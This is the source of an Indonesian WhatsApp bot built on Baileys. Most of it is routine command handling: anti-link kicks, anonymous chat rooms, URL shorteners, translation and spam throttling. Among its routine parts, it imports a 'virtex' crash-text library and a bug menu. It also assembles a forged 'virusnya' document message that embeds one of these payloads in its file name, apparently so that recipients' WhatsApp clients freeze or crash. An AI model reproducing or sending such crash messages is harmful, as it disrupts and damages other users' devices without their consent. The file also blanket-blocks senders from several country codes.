// CREATE BY LEXXY OFFICIAL

"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_menfes_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { mediafireDl } = require('./function/scrape_Mediafire')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { listmenu, rulesBot, donasiBot, anonyMenu, dlMenu, userMenu, animeMenu, funMenu, kerangMenu, grupMenu, searchMenu, nsfwMenu, bkpMenu, storeMenu, stikMenu, textMenu, convertMenu, asupanMenu, randomMenu, ownerMenu, audioMenu, primbonMenu, bugMenu, toolsMenu, tqto, mainMenu } = require('./help')
const itu_mark = 62895340684706 + "@s.whatsapp.net"
const ini_mark = 0 + "@s.whatsapp.net"
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif } = require('./function/exif')

// database virtex
const { philips } = require('./function/virtex/philips')
const { virus } = require('./function/virtex/virus')
const { ngazap } = require('./function/virtex/ngazap')

const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()

const Exif = require("./function/set_WM_Sticker")
const exif = new Exif()

const msgFilter = require("./function/func_Spam");
const mekih = fs.readFileSync ('./function/mod.jpg')
const pp_bot =fs.readFileSync ('./function/arul.jpg')

let orang_spam = []
let medianya = []

const mess = mess_JSON
const setting = setting_JSON
const antilink = antilink_JSON
const db_user = db_user_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_menfes = db_menfes_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"62895340684706@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

const isWelcome = isGroup ? welcomeJson.includes(from) : false
const isAntiLink = antilink.includes(from) ? true : false
const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

const quoted = msg.quoted ? msg.quoted : msg
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
	
const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

try {
var pp_user = await conn.profilePictureUrl(sender, 'image')
} catch {
var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

const PathAuto = "./function/menuPath/"

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

function monospace(string) {
return '```' + string + '```'
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const virusnya = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `GuraBot-MD ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await conn.groupInviteCode(from)
if (chats.includes(`chat.whatsapp.com`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await conn.sendMessage(from, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
await sleep(3000)
conn.groupParticipantsUpdate(from, [sender], "remove")
} else {
}
}

if (isGroup && isAutoDownTT){
if (chats.match(/(tiktok.com)/gi)){
reply(mess.wait)
var tt_teks = await fetchJson(`https://api.itsrose.my.id/downloader/tiktok?url=${chats}`)
var tt_res = tt_teks.download
conn.sendMessage(from,{video:{url:tt_res.nowm}, caption:'✅ Done'}, {quoted : msg})
}
}

if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

function toRupiah(angka) {
var saldonyeini = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldonyeini += angkarev.substr(i, 3) + '.';
return '' + saldonyeini.split('', saldonyeini.length - 1).reverse().join('');
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))}
}})
}

const cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

const setRoom = (satu, dua, tiga) => { 
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){
if (satu == "±id"){ db_menfes[i].id = tiga
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
if (satu == "±teman"){ db_menfes[i].teman = tiga 
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
}})
}

// auto read
//conn.readMessages([msg.key])

if (command === 'buatroom') {
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam Roomchat, Ketik *#stopchat* Untuk Menghentikan Sesi Chat.")
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
id: sender,
session: "buatroom",
data: {
penerima: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan Tulis Nomor Whatsapp Yg Ingin Di Ajak Ngobrol*\n\n*Contoh:* 62895340684706")
} else {
reply("Kamu Sedang Di Dalam Sesi Room Chat, Menunggu Konfirmasi Dari Penerima.")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "buatroom") {
if (chats.length === 0) return;
if (isNaN(chats)) return 
data_deposit.data.penerima = Number(chats);
if (data_deposit.data.penerima == sender.split('@')[0]) return reply('jangan nomor lu')
if (data_deposit.data.penerima == botNumber.split('@')[0]) return reply('itu kan nomor bot')
var cekap = await conn.onWhatsApp(chats+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${chats}\ntidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
data_deposit.session = "number_orang";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
var penerimanyo = data_deposit.data.penerima +'@s.whatsapp.net'
mentions(`Berhasil Mengirimkan Undangan Chat Ke @${penerimanyo.split('@')[0]} Tunggu Dia Menyetujui Undangan Tersebut Untuk Chat Secara Anonim`, [penerimanyo])
let roomC = `#${makeid(10)}`
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
var text_tersambung =`Seseorang Mengajak Chat, *Dari: Rahasia*, Silahkan Klik Button Jika Ingin Menghubungkan Chat`
let btn_room = [{ buttonId: `${prefix}buat_room_chat ${sender}|${data_deposit.data.penerima}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Terima️' }, type: 1 }]
var but_room = {
text: text_tersambung,
footer: 'Klik Button Untuk Menerima Chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(`${data_deposit.data.penerima}@s.whatsapp.net`, but_room)
}
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "setnamebot") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMABOT SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${setting.botName}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(2000)
setting.botName = data_deposit.data.nama_baru
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
await sleep(2000)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'changename') {

if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "changename",
data: {
nama_baru: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*namalu apa? biar bot ganti*")
} else {
reply("nama nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "changename") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMA SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${cekUser("name", sender)}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(1000)
setUser("±name", sender, data_deposit.data.nama_baru)
await sleep(2000)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'bitly_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "bitly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke bitly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "bitly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/bitly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://bitly.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'tinyurl_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "tinyurl_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke tinyurl.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "tinyurl_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/tinyurl?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://tinyurl.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'cuttly_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "cuttly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke cuttly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "cuttly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/cuttly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://cutt.ly/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'translate') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "translate",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim text yang ingin jadi translate ke inggris.*\n\n*Contoh:* Hai sayang")
} else {
reply("Text nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "translate") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)

var en = await fetchJson(`https://api.popcat.xyz/translate?to=en&text=${data_deposit.data.trannss}`) 
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*TRANSLATE*
*IND :* ${data_deposit.data.trannss}
*EN :* ${en.translated}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
}

msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
reply('Silahkan Jeda 5 Detik, Sebelum Menggunakan Command Berikutnya')
}

const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
reply('Silahkan Jeda 5 Detik, Sebelum Menggunakan Command Berikutnya')
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('91')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('92')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('90')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('54')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('55')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('40')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('94')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('60')) {
return conn.updateBlockStatus(sender, 'block')
}
 
// Tanggal ( MyMans APIs )
var buln = ['Januari', 'Februari', 'Maret', 'April', ' Mei ', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
var myHari = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
var tgel = new Date();
var hri = tgel.getDate();
var bulnh = tgel.getMonth();
var thisHari = tgel.getDay(),
    thisDaye = myHari[thisHari];
var yye = tgel.getYear();
var syear = (yye < 1000) ? yye + 1900 : yye;
var wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
var wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
var wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const jangwak = (hri + '' + buln[bulnh] + '' + syear)
const ketut = buln[bulnh]
const janghar = (thisDaye)  // hari
const titit = hri  // tanggal
const kanjud = buln[bulnh]  // bulan
const tutut = syear  // tahun

if (command) {
console.log(chalk.red(`~`) + `> [ \x1b[1;32mCMD\x1b[1;37m ]`, chalk.white(`${wib} WIB from`), chalk.green(`${pushname} => ${sender.split("@")[0]}`),chalk.white('in'), chalk.green(isGroup ? 'Group Chat' : 'Private Chat'))
}

//—————「 Set Random Image Menu 」—————//
var flaming = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text='
var fluming = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text='
var flarun = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=runner-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text='
var flasmurf = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=smurfs-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text='
var mehk = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text='
var awog = 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=amped-logo&doScale=true&scaleWidth=800&scaleHeight=500&text='
var mohai = 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=crafts-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&text='
var mhehe = 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text='

// Maker Random Image
let picaks = [flaming,fluming,flarun,flasmurf,mehk,awog,mohai,mhehe]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

// Pick Random Dokumen 
const filsj = ['application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','application/vnd.openxmlformats-officedocument.presentationml.presentation','application/vnd.openxmlformats-officedocument.wordprocessingml.document','application/pdf']
const filsk = filsj[Math.floor(Math.random() * filsj.length)]

var jumlha = '999'
var jumhal = '100000000000000'
var jumlah = '1000000000'
var link1 = "https://www.instagram.com/sahrulilham_09" 
var link2 = "https://chat.whatsapp.com/DJVpD9p2HZy1IjD6RT7LMG"
var nameDoc = 'Arulbot-MDོ | ᴹᴿ᭄ Arulོ ×፝֟͜×'

// Hit Nya
const hit = {}
if (isCmd) {
var data = await fetchJson('https://api.countapi.xyz/hit/naze-md/visits')
var jumlahcmd = `${data.value}`
var dataa = await fetchJson(`https://api.countapi.xyz/hit/naze-md${moment.tz('Asia/Jakarta').format('DDMMYYYY')}/visits`)
var jumlahharian = `${dataa.value}`
}

// Fake
